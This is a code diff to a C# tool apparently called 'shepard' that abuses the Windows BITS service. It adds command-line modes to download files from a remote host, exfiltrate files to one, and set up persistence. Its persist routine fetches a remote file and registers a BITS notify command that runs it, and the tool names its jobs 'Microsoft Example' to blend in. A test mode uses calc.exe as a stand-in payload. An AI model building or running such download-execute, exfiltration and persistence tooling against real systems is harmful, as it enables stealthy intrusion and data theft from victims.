@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Net;
 using BITS = BITSReference1_5;
 
@@ -11,7 +12,8 @@ namespace shepard
     {
         static BITS.BackgroundCopyManager1_5 mgr;
         static BITS.GUID jobGuid;
-        static BITS.IBackgroundCopyJob2 job;
+        static BITS.IBackgroundCopyJob job;
+        static BITS.IBackgroundCopyJob2 job2;
         static JobObj jo;
 
         public JobObj()
@@ -25,42 +27,43 @@ namespace shepard
 
             jo = new JobObj();
 
-            if (args.Length == 3)
+            string switchCase = args[0];
+
+            switch (switchCase)
             {
-                //ex shepard -d remoteLoc writeLoc
-                if (args[0] == "-d")
-                {
-                    jo.downloadFile("Microsoft Example QD_1", args[1], args[2]);
-                }
-                //ex shepard -e remoteLoc writeLoc
-                else if (args[0] == "-e")
-                {
-                    jo.exfiltrateFile("Microsoft Example QE_1", args[1], args[2]);
-                }
-            }
-            else if (args.Length == 4)
-            {
-                //ex shepard -dr remoteLoc writeLoc "argument argument argument" 
-                if (args[0] == "-dr")
-                {
-                    string temp = args[3];
-                    if (args[3] == "")
+                case "-d":
+                    if (args.Length == 3)
                     {
-                        temp = "";
+                        jo.downloadFile("Microsoft Example QD_1", args[1], args[2]);
+                        break;
                     }
-                    jo.stager(args[1], args[2], temp);
-                }
+                    return;
+                case "-e":
+                    if (args.Length == 3)
+                    {
+                        jo.exfiltrateFile("Microsoft Example QE_1", args[1], args[2]);
+                        break;
+                    }
+                    return;
+                case "-dr":
+                    if (args.Length == 4)
+                    {
+                        jo.persist(args[1], args[2], args[3]);
+                        break;
+                    }
+                    else if (args.Length == 3)
+                    {
+                        jo.persist(args[1], args[2], "");
+                        break;
+                    }
+                    return;
+                case "-t":
+                    jo.testpersist();
+                    return;
+                default:
+                    return;
             }
-            else { return; }
 
-        }
-
-        private void stager(string remoteLoc, string writeLoc, string optArgs)
-        {
-            string name = "Microsoft Example BD_1";
-            jo.downloadFile(name, remoteLoc, writeLoc); //initial download, completes
-
-            jo.persist(name, remoteLoc, writeLoc, optArgs);
         }
 
         //Usage params: url or ip:port, full path
@@ -110,13 +113,33 @@ namespace shepard
         }
 
         //Usage: BITS job name, file path, "file args"
-        private void persist(string name, string remote, string filePath, string cmdArgs)
+        private void persist(string remote, string filePath, string cmdArgs)
         {
+            string name = "Microsoft Example BD_1";
+            jo.downloadFile(name, remote, filePath); //initial download, completes
+
             mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
             job.AddFile(remote, filePath);
-            job.SetNotifyCmdLine(filePath, cmdArgs); //runs the file through CMD with params
+            job.SetNotifyInterface(job2);
+            job2.SetNotifyCmdLine(filePath, cmdArgs); //runs the file through CMD with params
             job.SetMinimumRetryDelay(60);
             
+            job.Resume();
+        }
+
+        private void testpersist()
+        {
+            string name = "Microsoft Example BD_1";
+            string remote = "https://aka.ms/WinServ16/StndPDF";
+            string filePath = "C:\\Users\\enzod\\Desktop\\Server2016.pdf";
+            jo.downloadFile(name, remote, filePath); //initial download, completes
+
+            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
+            job.AddFile(remote, filePath);
+            job.SetNotifyInterface(job2);
+            job2.SetNotifyCmdLine("C:\\Windows\\System32\\calc.exe", ""); //runs the file through CMD with params
+            job.SetMinimumRetryDelay(60);
+
             job.Resume();
         }
     }
